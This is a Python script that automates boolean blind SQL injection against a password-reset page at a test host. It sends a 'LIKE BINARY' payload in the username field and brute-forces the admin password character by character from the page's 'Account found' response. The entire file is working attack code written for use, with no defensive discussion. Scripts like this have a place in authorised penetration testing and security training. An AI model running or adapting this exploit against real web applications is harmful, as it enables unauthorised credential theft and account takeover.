#!python3
# likeBinaryInjection.py -v 1.5
# Author- David Sullivan
#
# Take a boolean response and brute force it for potential blind SQL injection using the 'LIKE BINARY' method
#
# Revision  1.0     -   12/27/2019- Initial creation of script
#
# To do:            -   Add command line arguments, options for multiple fields, other stuff I won't do

import requests, string

# define variables and lists
myurl = r'http://test.local/passwordreset.php?'
wordlist = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
fieldName = 'username'
payload = 'admin" and password LIKE BINARY "%'
ending = '%" #'
trueResponse = 'Account found'
filteredWordlist = ''
password = ''

# Take the above wordlist and brute force all potential characters in the password to narrow down brute forcing time
for c in wordlist:
    Data = {fieldName: payload + c + ending}
    r = requests.post(myurl, data=Data)
    response = r.content.decode('utf-8')
    if trueResponse in response:
        filteredWordlist += c
print("The available characters are " + filteredWordlist)

# Using the new wordlist, brute force each character of the password until it is discovered
count = 0
while True:
    for c in filteredWordlist:
        Data = {fieldName: payload.replace('%', '') + password + c + ending}
        r = requests.post(myurl, data=Data)
        response = r.content.decode('utf-8')
        if trueResponse in response:
            password += c
            print(password)
            break
    count += 1
    if count == len(filteredWordlist) + len(password):
        print("The password is " + password)
        exit()
